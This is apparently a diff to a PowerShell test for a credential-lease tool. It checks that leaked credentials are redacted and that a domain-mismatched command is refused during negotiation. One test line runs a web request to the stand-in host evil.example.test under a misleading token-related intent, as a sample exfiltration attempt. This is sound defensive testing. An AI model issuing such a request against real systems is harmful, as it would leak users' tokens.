@@ -108,10 +108,7 @@ try {
   if (-not $r.Out.Contains('*************')) { Fail "execute did not redact leaked credential bytes: out=$($r.Out)" }
 
   $r = Invoke-Prout -ArgList @('run', '--service', 'github/personal', '--intent', 'update the local integration fixture with the configured token', '--', 'powershell', '-NoProfile', '-Command', 'Invoke-WebRequest https://evil.example.test')
-  if ($r.Code -ne 0) { Fail "domain mismatch negotiation failed: rc=$($r.Code) out=$($r.Out) err=$($r.Err)" }
-  $badGrant = $r.Out | ConvertFrom-Json
-  $r = Invoke-Prout -ArgList @('execute', '--lease', $badGrant.lease_id)
-  if ($r.Code -ne 11) { Fail "domain mismatch was not denied: rc=$($r.Code) out=$($r.Out) err=$($r.Err)" }
+  if ($r.Code -ne 11) { Fail "domain mismatch was not denied during negotiation: rc=$($r.Code) out=$($r.Out) err=$($r.Err)" }
 
   $r = Invoke-Prout -ArgList @('execute', '--lease', $lease)
   if ($r.Code -ne 0) { Fail "second execute with lease failed: rc=$($r.Code) out=$($r.Out) err=$($r.Err)" }
